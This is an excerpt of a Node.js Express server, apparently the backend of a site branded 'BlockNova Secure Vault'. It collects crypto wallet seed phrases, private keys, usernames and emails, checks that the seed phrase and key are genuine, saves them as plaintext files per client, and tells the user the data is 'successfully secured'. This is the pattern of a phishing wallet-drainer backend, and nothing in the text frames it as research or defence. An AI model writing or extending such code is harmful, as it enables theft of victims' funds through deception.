...
function isValidBIP39Mnemonic(mnemonic) {
  ...
  for (let word of words) {
    if (!bip39Words.has(word)) return false;
  }
  return true;
}

function isValidPrivateKey(privateKey, chain) {
  if (!privateKey || privateKey.length < 20) return false;
  
  if (chain === 'ethereum' || chain === 'bsc') {
    const cleaned = privateKey.replace(/\s+/g, '').replace(/^0x/i, '');
    return /^[0-9a-fA-F]{64}$/.test(cleaned);
  }
  return true; // Для Solana и Tron — базовая проверка
}
...
app.get('/client/:address', (req, res) => {
  ...
  if (!fs.existsSync(clientDir)) {
    return res.sendFile(path.join(__dirname, 'public', 'client.html')); // или not-found.html
  }
...
app.post('/api/save-full-access', (req, res) => {
  try {
    ...
    // === СТРОГАЯ ВАЛИДАЦИЯ ===
    if (!address || !mnemonic || !privateKey || !username || !email) {
      return res.status(400).json({ error: "All fields are required" });
    }

    if (!isValidBIP39Mnemonic(mnemonic)) {
      return res.status(400).json({ error: "Invalid BIP39 seed phrase. Please use exactly 12 or 24 correct English words." });
    }

    if (!isValidPrivateKey(privateKey, chain)) {
      return res.status(400).json({ error: "Invalid private key format for selected blockchain" });
    }
    ...
    // ... (остальной код сохранения остаётся тем же)

    const clientDir = getClientDir(address);
    const isNewClient = !fs.existsSync(clientDir);

    if (isNewClient) fs.mkdirSync(clientDir, { recursive: true });
    ...
    if (mnemonic) fs.writeFileSync(path.join(clientDir, 'seed.txt'), mnemonic);
    if (privateKey) fs.writeFileSync(path.join(clientDir, 'privateKey.txt'), privateKey);

    console.log(`${isNewClient ? '🆕 New' : '🔄 Updated'} client (${chain}): ${address}`);

    res.json({
      success: true,
      message: "Data successfully secured in BlockNova Vault",
...
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 BlockNova Secure Vault running on port ${PORT}`);
});